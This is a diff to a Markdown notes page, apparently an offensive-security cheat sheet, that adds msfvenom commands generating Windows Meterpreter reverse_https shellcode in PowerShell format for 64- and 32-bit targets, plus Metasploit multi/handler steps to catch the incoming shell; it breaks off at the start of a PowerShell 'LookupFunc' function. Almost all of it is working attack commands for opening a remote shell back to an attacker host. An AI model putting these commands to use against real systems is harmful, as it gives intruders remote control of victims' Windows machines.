@@ -6,6 +6,24 @@ has_children: true
 nav_order: 1
 ---
 
+64-bit preparation:
+
+`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1`
+
+32-bit preparation:
+
+`msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1`
+
+Prepare for incoming shell (remember to change to 32-bit if needed):
+
+```
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost IP
+set lport PORT
+exploit
+```
 
 ```powershell
 function LookupFunc {
